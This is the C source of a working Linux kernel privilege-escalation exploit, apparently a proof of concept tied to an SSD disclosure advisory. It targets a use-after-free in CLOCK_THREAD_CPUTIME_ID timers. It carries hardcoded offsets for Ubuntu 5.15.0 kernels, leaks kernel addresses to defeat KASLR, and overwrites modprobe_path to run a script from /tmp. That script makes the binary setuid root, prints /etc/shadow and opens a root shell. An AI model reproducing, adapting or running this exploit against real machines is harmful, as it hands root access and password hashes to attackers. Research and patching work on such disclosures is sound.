// https://ssd-disclosure.com/ssd-advisory-linux-clock_thread_cputime_id-lpe/
#define _GNU_SOURCE 

#include <endian.h>
#include <errno.h>
#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <time.h>
#include <fcntl.h>
#include <unistd.h>
#include <assert.h>
#include <poll.h>
#include <sys/ioctl.h>
#include <sys/resource.h>
#include <sys/msg.h>
#include <net/if.h>
#include <netinet/ip.h>
#include <sys/wait.h>
#include <sys/shm.h>
#include <sys/utsname.h>
#include "libexp.h"

#define SPRAY_NUM1 100
#define SPRAY_NUM2 350
#define SPRAY_NUM3 200
#define PIPE_SPRAY_NUM 0x600
#define M_TS_LEN 0x1000
#define LEAK_SPRAY_NUM 0x1000
#define SHM_SPRAY_NUM 0x400
#define PAGE_SPRAY_NUM 0x100

#define def_kbase 0xffffffff81000000
struct config {
    char *release;
    u64 init_ipc_ns;
    u64 modprobe_path;
};

struct config configs[] = {
    {
        .release = "5.15.0-37-generic",
        .init_ipc_ns = 0xffffffff830824c0,
        .modprobe_path = 0xffffffff82e8b560
    },
    {
        .release = "5.15.0-39-generic",
        .init_ipc_ns = 0xffffffff83082580,
        .modprobe_path = 0xffffffff82e8b620
    },
    {
        .release = "5.15.0-40-generic",
        .init_ipc_ns = 0xffffffff83082580,
        .modprobe_path = 0xffffffff82e8b620
    }
};

int fd = 0;
int val = 0;
int *stage = &val;
int shm_fd = -1;
int *shm_stage;
timer_t timerids1[SPRAY_NUM1];
timer_t timerids2[SPRAY_NUM2];
timer_t timerids3[SPRAY_NUM3];
int pipe_fds[PIPE_SPRAY_NUM][2];
u64 kernel_base = 0;
u64 kaslr_slide = 0;
u64 kptr_vtable = 0;
u64 uptr_vtable = 0;
u64 msg_addr = 0;
u64 kbuf_addr = 0;
u64 ubuf_addr = 0;
char path[0x800];
u64 CPUID = 0;
u64 page_size = 0x1000;
char cpuid_env[0x20];
u64 init_ipc_ns = 0;
u64 modprobe_path = 0;

void *trigger_free(void *env_str)
{
    timer_t timerid;
    int ret = timer_create(CLOCK_THREAD_CPUTIME_ID, NULL, &timerid);
    assert(ret == 0);

    *stage = 1;
    while(*stage != 2);

    struct timespec tspec = {.tv_sec = 3, .tv_nsec = 0};
    struct itimerspec ispec = { .it_interval = tspec, .it_value = tspec};
    timer_settime(timerid, 0, &ispec, NULL);
    // getchar();

    // fd = memfd_create("exp", 0);
    // assert(fd >= 0);

    char *argv[] = {path, NULL};
    char *env[] = {env_str, cpuid_env, NULL};
    execve(path, argv, env);

    return NULL;
}

void spray_timer(timer_t *tids, u32 num)
{
    for(int i=0; i<num; i++) 
        timer_create(CLOCK_THREAD_CPUTIME_ID, NULL, &tids[i]);
}

void release_timer(timer_t *tids, u32 num, u32 jump)
{
    for(int i=0; i<num; i+=jump)
        timer_delete(tids[i]);
}

void leak_func()
{
    pthread_t tid;
    ts_fence();
    spray_timer(timerids1, SPRAY_NUM1);
    pthread_create(&tid, NULL, trigger_free, (void *)"LEAK=1");
    while(*stage != 1);
    spray_timer(timerids2, SPRAY_NUM2);
    spray_timer(timerids3, SPRAY_NUM3);

    release_timer(timerids1, SPRAY_NUM1, 1);
    release_timer(timerids2, SPRAY_NUM2, 1);
    release_timer(timerids3, SPRAY_NUM3, 2);

    //puts("Done");
    //int c = getchar();
    //printf("c : %#xn", c);
    //defragment(0x100, 0x1000);

    usleep(100*1000);
    *stage = 2;

    while(1);
}

void exp_func()
{
    pthread_t tid;
    ts_fence();
    spray_timer(timerids1, SPRAY_NUM1);
    pthread_create(&tid, NULL, trigger_free, (void *)"EXP=1");
    while(*stage != 1);
    spray_timer(timerids2, SPRAY_NUM2);
    spray_timer(timerids3, SPRAY_NUM3);

    release_timer(timerids1, SPRAY_NUM1, 1);
    release_timer(timerids2, SPRAY_NUM2, 1);
    release_timer(timerids3, SPRAY_NUM3, 2);

    usleep(100*1000);
    *stage = 2;

    while(1);
}

void leak_child_func()
{
    usleep(1000*100);

    // tell the parent process that the slab page is freed
    *shm_stage = 1;

    // wait for the parent process to reclaim the page
    while(*shm_stage != 2);

    // trigger unlink by exiting the process (in fact, the unlink happens in wait)
    puts("[!] Now trigger unlink in the child process!");
    exit(0);
}

void exp_child_func()
{
    usleep(1000*100);

    // tell the parent process that the slab page is freed
    *shm_stage = 1;

    // cannot sleep here or the timer will not be invoked
    // to avoid waiting CPU time (and increase the critical window), let's move it to another CPU
    set_cpu(CPUID);
    while(1);
}

int search_msgqid()
{
    int msgqid;
    struct msqid_ds ds;
    struct msginfo msginfo;
    int maxind = msgctl(0, MSG_INFO, (struct msqid_ds *) &msginfo);
    assert(maxind >= 0);

    char buffer[0x2000];
    int target_msgqid = -1;

    // printf("check %d msgsn", maxind);

    for(int i=0; i<maxind; i++) {
        int ret;
        msgqid = msgctl(i, MSG_STAT, &ds);
        assert(msgqid >= 0);
        for(int j=0; j<ds.msg_qnum; j++) {
            ret = msgrcv(msgqid, buffer, sizeof(buffer), 0, MSG_NOERROR | IPC_NOWAIT | MSG_COPY);
            assert(ret >= 0);
            if(ret >= 0x1000 && !memcmp(buffer, "AAAAAAAA", 8)) {
                target_msgqid = msgqid;
                // hex_print(buffer, 0x100);
                break;
            }
            msgrcv(msgqid, buffer, sizeof(buffer), 0, MSG_NOERROR | IPC_NOWAIT);
            if(j == ds.msg_qnum-1) {
                int ret = msgctl(msgqid, IPC_RMID, 0);
                assert(ret == 0);
            }
        }
    }
    return target_msgqid;
}

void increase_limit()
{
    int ret;
    struct rlimit open_file_limit;

    /* Query current soft/hard value */
    ret = getrlimit(RLIMIT_NOFILE, &open_file_limit);
    assert(ret >= 0);

    /* Set soft limit to hard limit */
    open_file_limit.rlim_cur = open_file_limit.rlim_max;
    ret = setrlimit(RLIMIT_NOFILE, &open_file_limit);
    assert(ret >= 0);
}

u64 leak_kbuf_addr()
{
    timer_t defrag_timers[0x400];
    spray_timer(defrag_timers, 0x400);

    // trigger UAF first
    if(!fork()) {
        set_cpu(CPUID);
        leak_func(); // this function will call execve, so no return
        while(1);
    }

    // wait for the slab page to be freed
    while(*shm_stage != 1);

    // do page spray
    void *addr = umem_alloc(NULL, page_size);
    int s = pg_vec_spray(addr, page_size, PAGE_SPRAY_NUM);
    *shm_stage = 2;

    // wait for the unlink to happen
    wait(NULL);

    // now we should have the heap leak!
    void *addr2 = mmap(NULL, page_size*PAGE_SPRAY_NUM, PROT_READ|PROT_WRITE, MAP_SHARED, s, 0);
    assert((u64)addr2 != -1);
    u64 heap_addr = 0;
    int idx = 0;
    while(!heap_addr && idx < 0x10*100) {
        u64 *obj_ptr = (u64 *)(addr2 + idx*0x100);
        if(obj_ptr[15] != 0) {
            heap_addr = obj_ptr[15] - 0x78;
            ubuf_addr = (u64)(obj_ptr) & 0xfffffffffffff000;
            break;
        }
        idx += 1;
    }
    if(!heap_addr) {
        puts("[-] leak kbuf_addr failed (but it's OK)");
        // clean up
        munmap(addr2, page_size*PAGE_SPRAY_NUM);
        close(s);
        return 0;
    }
    return heap_addr & 0xfffffffffffff000;
}

u64 leak_msg_addr()
{
    int msgqids[LEAK_SPRAY_NUM];

    // allocate msgq first, it is also in kmalloc-256
    for(int i=0; i<LEAK_SPRAY_NUM; i++) {
        msgqids[i] = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);
    }
    char buf[0xd0];
    memset(buf, 0, sizeof(buf));
    memset(&buf[0xb0], 'A', 0x20);
    memset(buf, 'A', 8);

    timer_t defrag_timers[0x100];
    spray_timer(defrag_timers, 0x100);

    // trigger UAF first
    if(!fork()) {
        set_cpu(CPUID);
        leak_func(); // this function will call execve, so no return
        while(1);
    }

    // wait for the slab page to be freed
    while(*shm_stage != 1);

    // do page spray
    void *addr = umem_alloc(NULL, page_size);
    int s = pg_vec_spray(addr, page_size, PAGE_SPRAY_NUM);
    *shm_stage = 2;

    // wait for the unlink to happen
    wait(NULL);

    // now we should have the heap leak!
    void *addr2 = mmap(NULL, page_size*PAGE_SPRAY_NUM, PROT_READ|PROT_WRITE, MAP_SHARED, s, 0);
    assert((u64)addr2 != -1);
    u64 heap_addr = 0;
    int idx = 0;
    while(!heap_addr && idx < page_size*PAGE_SPRAY_NUM/0x100) {
        u64 *obj_ptr = (u64 *)(addr2 + idx*0x100);
        if(obj_ptr[15] != 0) {
            heap_addr = obj_ptr[15] - 0x78;
            break;
        }
        idx += 1;
    }
    if(!heap_addr) {
        puts("[-] leak msg_addr failed (but it's OK)");
        // clean up
        munmap(addr2, page_size*PAGE_SPRAY_NUM);
        close(s);
        return 0;
    }

    // now try to free the page!
    munmap(addr2, page_size*PAGE_SPRAY_NUM);
    close(s);

    for(int i=0; i<LEAK_SPRAY_NUM; i++) {
        for(int j=0; j<4; j++) msgsnd(msgqids[i], buf, sizeof(buf)-8, IPC_NOWAIT);
    }
    return (heap_addr&0xfffffffffffff000) + 0x100;
}

void get_root()
{
    set_cpu(CPUID+1);
    int fd = open("/proc/sys/kernel/modprobe", 0);
    char buf[0x100];
    while(1) {
        lseek(fd, 0, SEEK_SET);
        read(fd, buf, sizeof(buf));
        if(!strncmp(buf, "//tmp/modprobe", 14)) break;
        sleep(1);
    }
    puts("[+] Payload is written! /proc/sys/kernel/modprobe now points to /tmp/modprobe!");
    system("echo 1 > /tmp/1; chmod +x /tmp/1; /tmp/1 2> /dev/null");
    char *argv[] = {path, NULL};
    char *env[] = {cpuid_env, NULL};
    execve(path, argv, env);
}

void context_setup()
{
    // handle CPUID
    char *id_str = getenv("CPUID");
    if(id_str) CPUID = atoi(id_str);
    else CPUID = cpu_num - 2;
    int ret = sprintf(cpuid_env, "CPUID=%lld", CPUID);
    assert(ret > 0);

    // handle page_size
    if(cpu_num >= 8) page_size = 0x2000;
    else page_size = 0x1000;
}

void prep_shm()
{
    shm_fd = open("/tmp/shm", O_RDWR|O_CREAT, 0666);
    ftruncate(shm_fd, 4);
    shm_stage = (int *)mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED, shm_fd, 0);
    *shm_stage = 0;
}

void check_root()
{
    // if we are root
    if(open("/etc/shadow", 0) >= 0) {
        setuid(0);
        system("head -n 10 /etc/shadow");
        system("/bin/bash");
        exit(0);
    }

    // or if we can be root
    int tmp_fd = open("/proc/sys/kernel/modprobe", 0);
    char buf[0x2000];
    memset(buf, 0, sizeof(buf));
    read(tmp_fd, buf, sizeof(buf));
    if(!strncmp(buf, "//tmp/modprobe", 14)) {
        sprintf(buf, "echo '#!/bin/basnchown root:root %s; chmod 04755 %s' > /tmp/modprobe; chmod +x /tmp/modprobe", path, path);
        system(buf);
        system("echo 1 > /tmp/1; chmod +x /tmp/1; /tmp/1 2> /dev/null");
        char *argv[] = {path, NULL};
        char *env[] = {cpuid_env, NULL};
        execve(path, argv, env);
    }
}

void setup_offsets(char *release)
{
    for(int i=0; i<sizeof(configs)/sizeof(configs[0]); i++) {
        if(!strcmp(configs[i].release, release)) {
            init_ipc_ns = configs[i].init_ipc_ns;
            modprobe_path = configs[i].modprobe_path;
            break;
        }
    }
    assert(init_ipc_ns != 0);
    assert(modprobe_path != 0);
}

int main(int argc, char **argv)
{
    context_setup();

    set_cpu(CPUID);
    increase_limit();

    // save absolute path for later use
    if(argc && argv[0] && argv[0][0]) assert(realpath(argv[0], path) != NULL);

    // trigger the UAF timer when trying to leak heap address
    if(getenv("LEAK")) {
        set_cpu(CPUID);
        prep_shm();
        leak_child_func();
        exit(0);
    }

    // trigger the UAF timer when trying to perform exploitation
    if(getenv("EXP")) {
        set_cpu(CPUID);
        prep_shm();
        exp_child_func();
        exit(0);
    }

    // in case we already are/can be root
    //check_root();

    // first thing first, before we get into a namespace
    // we launch a process that wait for root
    if(!clean_fork()) {
        get_root();
        sleep(10000);
    }

    struct utsname uname_buf;
    assert(uname(&uname_buf) == 0);
    printf("CPUID:      %lldn", CPUID);
    printf("page_size:  %#llxn", page_size);
    printf("release:    %sn", uname_buf.release);

    setup_offsets((char *)&uname_buf.release);

    prep_shm();
    setup_sandbox();
    setup_pg_vec();

    // step 1: leak kbuf_addr
    puts("[*] try to leak kernel buffer addr");
    while(!kbuf_addr) {
        cleanup_msgs();
        usleep(100000);
        kbuf_addr = leak_kbuf_addr();
    }
    printf("[+] kbuf_addr: %#llxn", kbuf_addr);
    printf("[+] ubuf_addr: %#llxn", ubuf_addr);
    assert(kbuf_addr != 0);
    assert(ubuf_addr != 0);
    *(u64 *)ubuf_addr = 0x4141414141414141;

    // reset shm_stage for orchestration
    *shm_stage = 0;

    // step 2: leak msg_msg addr
    puts("[*] try to leak msg_msg addr");
    while(!msg_addr) {
        cleanup_msgs();
        usleep(100000);
        msg_addr = leak_msg_addr();
    }
    printf("[+] msg_msg addr: %#llxn", msg_addr);
    assert(msg_addr != 0);

    // reset shm_stage for orchestration
    *shm_stage = 0;
    // step 2: trigger the vulnerability again and reclaim the page
    // trigger UAF
    if(!fork()) {
        set_cpu(CPUID);
        exp_func(); // this function will call execve, so no return
        while(1);
    }

    // wait for the slab page to be freed
    while(*shm_stage != 1);

    // do page spray, the payload is used for trapping CPU0 to an infinite loop so we can
    // later modify the memory in CPU1
    void *addr = umem_alloc(NULL, page_size);
    *(u64 *)(ubuf_addr+0x130) = kbuf_addr+0x120;
    for(int i=0; i<page_size/0x100; i++) {
        u64 *obj_ptr = (u64 *)(addr-0x40+-2+i*0x100);
        obj_ptr[10] = M_TS_LEN; // timer->it_requeue_pending
        obj_ptr[11] = 0x000000012a05f200;
        obj_ptr[14] = msg_addr-0x20; // timer->sigq
        obj_ptr[16] = kbuf_addr + 0x120;
        obj_ptr[17] = kbuf_addr + 0x100;
        obj_ptr[18] = 0x000000012a061742;
        obj_ptr[19] = kbuf_addr; // head
    }
    int s = pg_vec_spray(addr, page_size, PAGE_SPRAY_NUM);
    *shm_stage = 2;

    // now, wait for the timer to get triggered.
    // when it is triggered, timer->firing will become 1, then we know where is the timer
    // in the buffer and the CPU0 is halted
    set_cpu(CPUID+1); // switch to CPU1 because CPU0 will hang
    void *addr2 = mmap(NULL, page_size*PAGE_SPRAY_NUM, PROT_READ|PROT_WRITE, MAP_SHARED, s, 0);
    u64 *timer_ptr = NULL;
    while(!timer_ptr) {
        int idx = 0;
        while(idx < page_size*PAGE_SPRAY_NUM/0x100) {
            u64 *obj_ptr = (u64 *)(addr2 + idx*0x100);
            // if(idx % 0x10==0)printf("a: %pn", obj_ptr);
            if(obj_ptr[23] == 1) {// tmr.firing == 1
                timer_ptr = obj_ptr;
                break;
            }
            idx++;
        }
    }

    // now we know tmr->firing is set, CPU0 is going to be trapped very soon
    // let's waste a few cycles to ensure that
    read(-1, NULL, 0);

    // now we are sure CPU0 is trapped =>
    // 1. clear out the timer's first part to avoid locking issues
    // 2. modify the timer so it won't be added to the firing list again immediately, but will be triggered in 2 seconds
    // 3. release CPU0 by making it think it reaches a leaf node
    memset(timer_ptr, 0, 0x50);
    timer_ptr[18] = 0x000000012a061742*2;
    *(u64 *)(ubuf_addr + 0x130) = 0;

    // now we are back to CPU0!    so we spray in the per-CPU cache!
    set_cpu(CPUID);
    printf("[+] timer_ptr: %pn", timer_ptr);

    // at this moment, we have a msg_msg with an enlarged m_ts, let's find it!
    puts("[*] Looking for the victim msg_msg...");
    int msgqid = search_msgqid();
    assert(msgqid >= 0);
    printf("[+] Found it! msgqid: %dn", msgqid);

    // alright, let's spray tons of shmid to leak kaslr
    int shmids[SHM_SPRAY_NUM];
    char buffer[0x2000];
    memset(buffer, 0, sizeof(buffer));
    for(int i=0; i<SHM_SPRAY_NUM; i++) shmids[i] = shmget(IPC_PRIVATE, 1, 0600);
    int ret = msgrcv(msgqid, buffer, sizeof(buffer), 0, MSG_NOERROR | IPC_NOWAIT | MSG_COPY);
    assert(ret >= 0);
    // search for shmid, we can't be unluckly enough that there is no shmid_kernel in the PAGE?
    for(int i=0; i<(page_size/0x100)-2; i++) {
        u64 *obj_ptr = (u64 *)(buffer + 0xd0 + i*0x100);
        u64 val = obj_ptr[29]; // shmid_kernel->ns, should be init_ipc_ns
        if(((val-init_ipc_ns) & 0xfff) == 0) {
            kaslr_slide = val - init_ipc_ns;
            kernel_base = kaslr_slide + def_kbase;
            break;
        }
    }
    printf("[+] kernel_base: %#llxn", kernel_base);
    printf("[+] kaslr_slide: %#llxn", kaslr_slide);
    if(kernel_base == 0) {
        hex_print(buffer, sizeof(buffer));
        timer_ptr[18] = 0xffffffffffff;// disarm timer to avoid crash
        getchar();
        exit(0);
    }
    assert(kernel_base != 0);

    // now we have KASLR leak and the timer will be triggered again in a few seconds
    // let's prepare the timer
    *(u64 *)(ubuf_addr+0x130) = kbuf_addr+0x120;
    timer_ptr[10] = 0x706d742f-1; // timer->it_requeue_pending => /tmp
    timer_ptr[11] = 0x000000012a05f200;
    timer_ptr[14] = kaslr_slide + modprobe_path - 0x38 + 1; // overwrirte modprobe_path+1 with /tmp => /sbin/modprobe becomes //tmp/modprobe
    timer_ptr[15] = 0;
    timer_ptr[16] = kbuf_addr + 0x120;
    timer_ptr[17] = kbuf_addr + 0x100;
    timer_ptr[18] = 0x000000012a061742*2;
    timer_ptr[19] = kbuf_addr; // head

    // switch to CPU1 again because we know CPU0 will be trapped again in a few seconds
    set_cpu(CPUID+1);

    // now wait CPU0 to get trapped
    timer_ptr[23] = 0; // tmr->firing = 0
    while(!timer_ptr[23]); // wait for firing to be set
    read(-1, NULL, 0); // waste a few cycles to ensure CPU0 is trapped

    // 1. make sure the timer will not be triggered again by setting a huge expire value
    // 2. resume its execution, write a heap pointer before modprobe_path so that send_sigqueue will not panic
    timer_ptr[18] = 0xffffffffffff;
    *(u64 *)(ubuf_addr + 0x130) = kaslr_slide + modprobe_path - 0x30 - 6; 

    // prepare payload
    puts("[*] Waiting for payload to be written into '/proc/sys/kernel/modprobe'...");
    sprintf(buffer, "echo '#!/bin/bashnchown root:root %s; chmod 04755 %s' > /tmp/modprobe; chmod +x /tmp/modprobe", path, path);
    system(buffer);
    // now wait for the get_root subprocess to wake up and launch a root shell
    wait(NULL);

    return 0;
}